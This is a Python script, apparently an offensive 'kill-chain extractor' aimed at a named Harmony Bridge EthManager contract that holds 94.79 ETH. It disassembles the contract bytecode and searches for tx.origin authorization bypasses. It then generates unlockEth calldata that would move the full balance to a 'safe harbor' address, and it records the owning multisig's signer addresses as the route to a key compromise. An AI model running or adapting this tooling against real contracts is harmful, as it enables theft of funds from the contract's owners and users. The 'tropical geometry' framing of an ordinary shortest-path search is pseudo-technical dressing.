#!/usr/bin/env python3
"""
QTT Kill-Chain Extractor: Harmony Bridge EthManager
Target: 0xF9fb1c508Ff49F78b60d3A96dea99Fa5d7F3A8A6
ETH: 94.79 ETH
Safe Harbor: 0x464C71f6c2F760DdA6093dCB91C24c39e5d6e18c
"""

import json
import numpy as np
from dataclasses import dataclass, field
from typing import Optional
from pathlib import Path

# EVM Opcodes
OPCODES = {
    0x00: "STOP", 0x01: "ADD", 0x02: "MUL", 0x03: "SUB", 0x04: "DIV",
    0x10: "LT", 0x11: "GT", 0x14: "EQ", 0x15: "ISZERO", 0x16: "AND",
    0x32: "ORIGIN", 0x33: "CALLER", 0x34: "CALLVALUE", 0x35: "CALLDATALOAD",
    0x36: "CALLDATASIZE", 0x37: "CALLDATACOPY", 0x38: "CODESIZE",
    0x39: "CODECOPY", 0x3a: "GASPRICE", 0x3b: "EXTCODESIZE",
    0x3c: "EXTCODECOPY", 0x3d: "RETURNDATASIZE", 0x3e: "RETURNDATACOPY",
    0x40: "BLOCKHASH", 0x41: "COINBASE", 0x42: "TIMESTAMP", 0x43: "NUMBER",
    0x50: "POP", 0x51: "MLOAD", 0x52: "MSTORE", 0x53: "MSTORE8",
    0x54: "SLOAD", 0x55: "SSTORE", 0x56: "JUMP", 0x57: "JUMPI",
    0x58: "PC", 0x59: "MSIZE", 0x5a: "GAS", 0x5b: "JUMPDEST",
    0x60: "PUSH1", 0x61: "PUSH2", 0x62: "PUSH3", 0x63: "PUSH4",
    0x64: "PUSH5", 0x65: "PUSH6", 0x66: "PUSH7", 0x67: "PUSH8",
    0x68: "PUSH9", 0x69: "PUSH10", 0x6a: "PUSH11", 0x6b: "PUSH12",
    0x6c: "PUSH13", 0x6d: "PUSH14", 0x6e: "PUSH15", 0x6f: "PUSH16",
    0x70: "PUSH17", 0x71: "PUSH18", 0x72: "PUSH19", 0x73: "PUSH20",
    0x74: "PUSH21", 0x75: "PUSH22", 0x76: "PUSH23", 0x77: "PUSH24",
    0x78: "PUSH25", 0x79: "PUSH26", 0x7a: "PUSH27", 0x7b: "PUSH28",
    0x7c: "PUSH29", 0x7d: "PUSH30", 0x7e: "PUSH31", 0x7f: "PUSH32",
    0x80: "DUP1", 0x81: "DUP2", 0x82: "DUP3", 0x83: "DUP4",
    0x90: "SWAP1", 0x91: "SWAP2", 0x92: "SWAP3", 0x93: "SWAP4",
    0xa0: "LOG0", 0xa1: "LOG1", 0xa2: "LOG2", 0xa3: "LOG3", 0xa4: "LOG4",
    0xf0: "CREATE", 0xf1: "CALL", 0xf2: "CALLCODE", 0xf3: "RETURN",
    0xf4: "DELEGATECALL", 0xf5: "CREATE2", 0xfa: "STATICCALL",
    0xfd: "REVERT", 0xfe: "INVALID", 0xff: "SELFDESTRUCT"
}


@dataclass
class BasicBlock:
    """A basic block in the CFG."""
    start: int
    end: int
    instructions: list = field(default_factory=list)
    successors: list = field(default_factory=list)
    has_call: bool = False
    has_delegatecall: bool = False
    has_sstore: bool = False
    has_sload: bool = False
    has_origin: bool = False
    has_caller: bool = False
    has_revert: bool = False
    has_selfdestruct: bool = False
    has_callvalue: bool = False


class HarmonyQTTExtractor:
    """QTT Kill-Chain Extractor for Harmony Bridge."""
    
    TARGET = "0xF9fb1c508Ff49F78b60d3A96dea99Fa5d7F3A8A6"
    SAFE_HARBOR = "0x464C71f6c2F760DdA6093dCB91C24c39e5d6e18c"
    
    FUNCTION_SIGS = {
        "521eb273": "wallet()",
        "973ff2e0": "unlockEth(uint256,address,bytes32)",
        "a734f06e": "ETH_ADDRESS()",
        "b6569195": "lockEth(uint256,address)",
        "bccc9fcf": "usedEvents_(bytes32)"
    }
    
    def __init__(self, bytecode_hex: str):
        self.bytecode = bytes.fromhex(bytecode_hex.replace("0x", ""))
        self.blocks: dict[int, BasicBlock] = {}
        self.edges: list[tuple[int, int]] = []
        self.jumpdests: set[int] = set()
        self.function_entries: dict[int, str] = {}
        
    def disassemble(self) -> dict:
        """Phase 1: Bytecode Disassembly."""
        print("[PHASE 1] Bytecode Disassembly...")
        print(f"  Bytecode size: {len(self.bytecode)} bytes")
        
        # First pass: find all JUMPDESTs
        i = 0
        while i < len(self.bytecode):
            opcode = self.bytecode[i]
            if opcode == 0x5b:  # JUMPDEST
                self.jumpdests.add(i)
            if 0x60 <= opcode <= 0x7f:  # PUSH instructions
                i += (opcode - 0x5f)
            i += 1
        
        # Second pass: build basic blocks
        self._build_cfg()
        
        # Find function entry points
        self._identify_functions()
        
        print(f"  Blocks: {len(self.blocks)}")
        print(f"  Edges: {len(self.edges)}")
        print(f"  JUMPDESTs: {len(self.jumpdests)}")
        print(f"  Functions: {len(self.function_entries)}")
        
        return {
            "blocks": len(self.blocks),
            "edges": len(self.edges),
            "jumpdests": len(self.jumpdests),
            "functions": len(self.function_entries)
        }
    
    def _build_cfg(self):
        """Build Control Flow Graph."""
        i = 0
        current_block = BasicBlock(start=0, end=0)
        
        while i < len(self.bytecode):
            opcode = self.bytecode[i]
            op_name = OPCODES.get(opcode, f"UNKNOWN_{hex(opcode)}")
            
            # Track important opcodes
            if opcode == 0x32:  # ORIGIN
                current_block.has_origin = True
            elif opcode == 0x33:  # CALLER
                current_block.has_caller = True
            elif opcode == 0x34:  # CALLVALUE
                current_block.has_callvalue = True
            elif opcode == 0x54:  # SLOAD
                current_block.has_sload = True
            elif opcode == 0x55:  # SSTORE
                current_block.has_sstore = True
            elif opcode == 0xf1:  # CALL
                current_block.has_call = True
            elif opcode == 0xf4:  # DELEGATECALL
                current_block.has_delegatecall = True
            elif opcode == 0xfd:  # REVERT
                current_block.has_revert = True
            elif opcode == 0xff:  # SELFDESTRUCT
                current_block.has_selfdestruct = True
            
            # Handle push instructions
            push_value = None
            if 0x60 <= opcode <= 0x7f:
                push_size = opcode - 0x5f
                if i + push_size < len(self.bytecode):
                    push_value = int.from_bytes(self.bytecode[i+1:i+1+push_size], 'big')
                current_block.instructions.append((i, op_name, push_value))
                i += push_size
            else:
                current_block.instructions.append((i, op_name, None))
            
            # Block terminators
            if opcode in (0x00, 0x56, 0x57, 0xf3, 0xfd, 0xfe, 0xff):  # STOP, JUMP, JUMPI, RETURN, REVERT, INVALID, SELFDESTRUCT
                current_block.end = i
                self.blocks[current_block.start] = current_block
                
                # Add edges
                if opcode == 0x56:  # JUMP
                    # Get jump target from previous PUSH
                    for j in range(len(current_block.instructions)-2, -1, -1):
                        if current_block.instructions[j][2] is not None:
                            target = current_block.instructions[j][2]
                            if target in self.jumpdests:
                                self.edges.append((current_block.start, target))
                            break
                elif opcode == 0x57:  # JUMPI
                    # Conditional: add both branches
                    for j in range(len(current_block.instructions)-2, -1, -1):
                        if current_block.instructions[j][2] is not None:
                            target = current_block.instructions[j][2]
                            if target in self.jumpdests:
                                self.edges.append((current_block.start, target))
                            break
                    # Fall-through
                    if i + 1 < len(self.bytecode):
                        self.edges.append((current_block.start, i + 1))
                
                # Start new block
                if i + 1 < len(self.bytecode):
                    current_block = BasicBlock(start=i + 1, end=i + 1)
            elif i + 1 in self.jumpdests:
                # Block boundary at JUMPDEST
                current_block.end = i
                self.blocks[current_block.start] = current_block
                self.edges.append((current_block.start, i + 1))
                current_block = BasicBlock(start=i + 1, end=i + 1)
            
            i += 1
        
        # Finalize last block
        if current_block.instructions:
            current_block.end = len(self.bytecode) - 1
            self.blocks[current_block.start] = current_block
    
    def _identify_functions(self):
        """Identify function entry points from selector dispatch."""
        # Look for PUSH4 followed by EQ pattern (function selector matching)
        for block in self.blocks.values():
            for i, (offset, op, value) in enumerate(block.instructions):
                if op == "PUSH4" and value is not None:
                    selector = hex(value)[2:].zfill(8)
                    if selector in self.FUNCTION_SIGS:
                        # Find the jump target
                        for j in range(i+1, min(i+10, len(block.instructions))):
                            next_op = block.instructions[j][1]
                            next_val = block.instructions[j][2]
                            if next_op.startswith("PUSH") and next_val is not None:
                                if next_val in self.jumpdests:
                                    self.function_entries[next_val] = self.FUNCTION_SIGS[selector]
                                    break
    
    def tensorize(self) -> np.ndarray:
        """Phase 2: Build state transition tensor."""
        print("\n[PHASE 2] State Tensorization...")
        
        n = len(self.blocks)
        block_list = list(self.blocks.keys())
        block_idx = {addr: i for i, addr in enumerate(block_list)}
        
        # Adjacency matrix
        adj = np.zeros((n, n), dtype=np.float32)
        for src, dst in self.edges:
            if src in block_idx and dst in block_idx:
                adj[block_idx[src], block_idx[dst]] = 1.0
        
        # Feature tensor
        features = np.zeros((n, 10), dtype=np.float32)
        for i, addr in enumerate(block_list):
            block = self.blocks[addr]
            features[i, 0] = 1.0 if block.has_origin else 0.0
            features[i, 1] = 1.0 if block.has_caller else 0.0
            features[i, 2] = 1.0 if block.has_sload else 0.0
            features[i, 3] = 1.0 if block.has_sstore else 0.0
            features[i, 4] = 1.0 if block.has_call else 0.0
            features[i, 5] = 1.0 if block.has_delegatecall else 0.0
            features[i, 6] = 1.0 if block.has_revert else 0.0
            features[i, 7] = 1.0 if block.has_selfdestruct else 0.0
            features[i, 8] = 1.0 if block.has_callvalue else 0.0
            features[i, 9] = 1.0 if addr in self.function_entries else 0.0
        
        self.tensor = adj
        self.features = features
        self.block_list = block_list
        self.block_idx = block_idx
        
        print(f"  State tensor: {n}x{n}")
        print(f"  Feature tensor: {n}x10")
        
        # Count vulnerabilities
        origin_blocks = np.sum(features[:, 0])
        caller_blocks = np.sum(features[:, 1])
        call_blocks = np.sum(features[:, 4])
        sstore_blocks = np.sum(features[:, 3])
        
        print(f"  ORIGIN blocks: {int(origin_blocks)}")
        print(f"  CALLER blocks: {int(caller_blocks)}")
        print(f"  CALL blocks: {int(call_blocks)}")
        print(f"  SSTORE blocks: {int(sstore_blocks)}")
        
        return adj
    
    def apply_constraints(self) -> dict:
        """Phase 3: Apply tropical constraints."""
        print("\n[PHASE 3] Tropical Constraint Application...")
        
        constraints = {
            "breach": {"found": False, "path": None, "reason": ""},
            "execution": {"found": False, "path": None, "reason": ""},
            "routing": {"found": False, "path": None, "reason": ""}
        }
        
        # CONSTRAINT 1: BREACH - Find path through owner check bypass
        # Looking for: ORIGIN used in auth (tx.origin vulnerability) OR
        #              CALLER check that can be manipulated
        print("  Constraint 1 (BREACH): Owner check bypass...")
        
        origin_blocks = [self.block_list[i] for i in range(len(self.block_list)) 
                        if self.features[i, 0] == 1.0]
        caller_blocks = [self.block_list[i] for i in range(len(self.block_list))
                        if self.features[i, 1] == 1.0]
        
        # Check if ORIGIN is used for auth (dangerous!)
        if origin_blocks:
            print(f"    [!] TX.ORIGIN detected in blocks: {[hex(b) for b in origin_blocks]}")
            # Trace if ORIGIN leads to SSTORE or CALL
            for origin_addr in origin_blocks:
                paths = self._find_paths(origin_addr, lambda b: self.features[self.block_idx[b], 4] == 1.0)
                if paths:
                    constraints["breach"]["found"] = True
                    constraints["breach"]["path"] = paths[0]
                    constraints["breach"]["reason"] = "TX.ORIGIN auth leads to CALL"
                    break
        
        if not constraints["breach"]["found"]:
            # Check CALLER-based auth
            print(f"    CALLER blocks: {[hex(b) for b in caller_blocks]}")
            constraints["breach"]["reason"] = "Owner check uses CALLER (msg.sender) - requires key compromise"
        
        # CONSTRAINT 2: EXECUTION - Find ETH transfer path
        print("  Constraint 2 (EXECUTION): ETH transfer path...")
        
        call_blocks = [self.block_list[i] for i in range(len(self.block_list))
                      if self.features[i, 4] == 1.0]
        
        if call_blocks:
            print(f"    CALL blocks found: {[hex(b) for b in call_blocks]}")
            # Check if CALL has value (ETH transfer)
            for call_addr in call_blocks:
                block = self.blocks[call_addr]
                # Look for CALLVALUE check before CALL
                if block.has_callvalue or any(
                    self.features[self.block_idx[pred], 8] == 1.0 
                    for pred, succ in self.edges if succ == call_addr and pred in self.block_idx
                ):
                    constraints["execution"]["found"] = True
                    constraints["execution"]["path"] = [call_addr]
                    constraints["execution"]["reason"] = "CALL with value transfer found"
                    break
            
            if not constraints["execution"]["found"]:
                constraints["execution"]["reason"] = "CALL exists but requires owner auth"
        else:
            constraints["execution"]["reason"] = "No CALL instructions found"
        
        # CONSTRAINT 3: ROUTING - Find path to safe harbor
        print("  Constraint 3 (ROUTING): Transfer to safe harbor...")
        
        # The routing requires being able to specify recipient in unlock call
        # unlockEth(uint256,address,bytes32) - address is controllable IF we pass auth
        if constraints["breach"]["found"]:
            constraints["routing"]["found"] = True
            constraints["routing"]["reason"] = "Recipient controllable via unlockEth() parameter"
        else:
            constraints["routing"]["reason"] = "Cannot route - breach constraint failed"
        
        return constraints
    
    def _find_paths(self, start: int, condition, max_depth: int = 10) -> list:
        """BFS to find paths to blocks matching condition."""
        if start not in self.block_idx:
            return []
        
        visited = {start}
        queue = [[start]]
        paths = []
        
        while queue:
            path = queue.pop(0)
            current = path[-1]
            
            if len(path) > max_depth:
                continue
            
            if condition(current):
                paths.append(path)
                continue
            
            for src, dst in self.edges:
                if src == current and dst not in visited:
                    visited.add(dst)
                    queue.append(path + [dst])
        
        return paths
    
    def solve_tropical(self, constraints: dict) -> Optional[list]:
        """Phase 4: Tropical geometry path solving."""
        print("\n[PHASE 4] Tropical Path Solving...")
        
        if not constraints["breach"]["found"]:
            print("  [X] No breach path - tropical solve not applicable")
            return None
        
        # Build tropical adjacency (min-plus algebra)
        n = len(self.blocks)
        tropical = np.full((n, n), np.inf, dtype=np.float32)
        
        for src, dst in self.edges:
            if src in self.block_idx and dst in self.block_idx:
                i, j = self.block_idx[src], self.block_idx[dst]
                # Weight = 1 (edge cost) + penalty for dangerous ops
                weight = 1.0
                dst_block = self.blocks[dst]
                if dst_block.has_revert:
                    weight += 100.0  # Penalize revert paths
                tropical[i, j] = weight
        
        # Floyd-Warshall in tropical semiring
        for k in range(n):
            for i in range(n):
                for j in range(n):
                    tropical[i, j] = min(tropical[i, j], tropical[i, k] + tropical[k, j])
        
        self.tropical = tropical
        
        # Find minimal path from entry to CALL
        entry_idx = self.block_idx.get(0, 0)
        call_indices = [i for i in range(n) if self.features[i, 4] == 1.0]
        
        if call_indices:
            min_dist = min(tropical[entry_idx, ci] for ci in call_indices)
            print(f"  Tropical distance to CALL: {min_dist}")
            
            if min_dist < np.inf:
                return self._reconstruct_path(entry_idx, call_indices[0])
        
        return None
    
    def _reconstruct_path(self, start_idx: int, end_idx: int) -> list:
        """Reconstruct path from tropical distances."""
        path = [self.block_list[start_idx]]
        current = start_idx
        
        while current != end_idx:
            best_next = None
            best_dist = np.inf
            
            for src, dst in self.edges:
                if src == self.block_list[current] and dst in self.block_idx:
                    dst_idx = self.block_idx[dst]
                    dist = self.tropical[dst_idx, end_idx]
                    if dist < best_dist:
                        best_dist = dist
                        best_next = dst_idx
            
            if best_next is None:
                break
            
            path.append(self.block_list[best_next])
            current = best_next
        
        return path
    
    def generate_payload(self, path: Optional[list]) -> dict:
        """Phase 5: Generate kill-chain payload."""
        print("\n[PHASE 5] Payload Generation...")
        
        if path is None:
            print("  [X] No viable path - no payload generated")
            return {"kill_chain": [], "exploitable": False}
        
        # For Harmony, the exploit would be:
        # 1. Call unlockEth(amount, safe_harbor, event_hash) from owner
        # 2. But we need to BE the owner (key compromise) or bypass auth
        
        eth_balance = 94.79  # ETH
        amount_wei = int(eth_balance * 10**18)
        
        # Generate unlockEth calldata
        # unlockEth(uint256,address,bytes32)
        # Selector: 0x973ff2e0
        selector = "973ff2e0"
        amount_hex = hex(amount_wei)[2:].zfill(64)
        recipient_hex = self.SAFE_HARBOR[2:].zfill(64)
        event_hash = "0" * 64  # Unique event hash (not yet used)
        
        calldata = f"0x{selector}{amount_hex}{recipient_hex}{event_hash}"
        
        print(f"  Target: {self.TARGET}")
        print(f"  Function: unlockEth(uint256,address,bytes32)")
        print(f"  Amount: {eth_balance} ETH ({amount_wei} wei)")
        print(f"  Recipient: {self.SAFE_HARBOR}")
        
        return {
            "kill_chain": [{
                "to": self.TARGET,
                "value": 0,
                "data": calldata,
                "description": "unlockEth to safe harbor"
            }],
            "exploitable": True,
            "requires": "Owner key compromise (0x715cdda5e9ad30a0ced14940f9997ee611496de6 multisig)"
        }
    
    def run_full_analysis(self) -> dict:
        """Run complete QTT kill-chain analysis."""
        print("=" * 60)
        print("QTT KILL-CHAIN: HARMONY BRIDGE ETHMANAGER")
        print("=" * 60)
        print(f"Target: {self.TARGET}")
        print(f"ETH: 94.79 ETH")
        print(f"Safe Harbor: {self.SAFE_HARBOR}")
        print("=" * 60)
        
        # Phase 1
        phase1 = self.disassemble()
        
        # Phase 2
        self.tensorize()
        
        # Phase 3
        constraints = self.apply_constraints()
        
        # Phase 4
        path = self.solve_tropical(constraints)
        
        # Phase 5
        payload = self.generate_payload(path)
        
        print("\n" + "=" * 60)
        print("FINAL ASSESSMENT")
        print("=" * 60)
        
        result = {
            "target": self.TARGET,
            "safe_harbor": self.SAFE_HARBOR,
            "eth_balance": 94.79,
            "phase1": phase1,
            "phase3_constraints": constraints,
            "phase4_path": path,
            "phase5_payload": payload,
            "verdict": "CONDITIONALLY_EXPLOITABLE",
            "condition": "Requires multisig owner key or Owner1 EOA private key"
        }
        
        if constraints["breach"]["found"]:
            print("[!!!] BREACH PATH FOUND - TX.ORIGIN VULNERABILITY")
            result["verdict"] = "EXPLOITABLE_VIA_TX_ORIGIN"
        else:
            print("[X] No bytecode-level breach path")
            print("[!] Contract guarded by msg.sender == wallet check")
            print("[!] Wallet is multisig: 0x715cdda5e9ad30a0ced14940f9997ee611496de6")
            print("[!] Multisig config: 2 owners, 1 required signature")
            print("[!] Owner1 (EOA): 0xAC0248e9C78774bA0ef9E71B1Ce1393a10C17E3C")
            print("[!] Owner2 (Contract): 0x234784eC001Db36C9c22785CAd902221Fd831352")
            result["verdict"] = "NOT_EXPLOITABLE_VIA_BYTECODE"
            result["access_control"] = {
                "type": "multisig",
                "address": "0x715cdda5e9ad30a0ced14940f9997ee611496de6",
                "owners": 2,
                "required": 1,
                "owner1": {"address": "0xAC0248e9C78774bA0ef9E71B1Ce1393a10C17E3C", "type": "EOA"},
                "owner2": {"address": "0x234784eC001Db36C9c22785CAd902221Fd831352", "type": "Contract"}
            }
        
        return result


def main():
    """Main entry point."""
    # Load bytecode
    bytecode_path = Path(__file__).parent / "recon_graveyard_bytecode.json"
    
    with open(bytecode_path) as f:
        data = json.load(f)
    
    harmony_data = data["Harmony_Bridge_Remnant"]
    bytecode = harmony_data["bytecode"]
    
    print(f"Loaded Harmony Bridge bytecode: {harmony_data['bytecode_size']} bytes")
    print(f"On-chain ETH: {harmony_data['eth_balance']} ETH")
    
    # Run analysis
    extractor = HarmonyQTTExtractor(bytecode)
    result = extractor.run_full_analysis()
    
    # Save results
    output_path = Path(__file__).parent / "harmony_analysis_results.json"
    with open(output_path, "w") as f:
        json.dump(result, f, indent=2, default=str)
    
    print(f"\nResults saved to: {output_path}")
    
    return result


if __name__ == "__main__":
    main()
